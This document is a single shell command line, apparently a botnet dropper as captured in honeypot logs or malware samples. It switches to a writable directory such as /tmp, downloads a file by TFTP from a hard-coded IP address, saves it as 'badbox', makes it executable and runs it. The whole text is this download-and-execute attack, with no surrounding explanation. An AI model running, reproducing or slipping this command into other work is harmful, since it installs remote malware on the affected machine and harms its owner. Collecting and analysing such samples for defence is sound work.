cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 94.177.199.172 -c get sh;cat sh >badbox;chmod +x *;./badbox
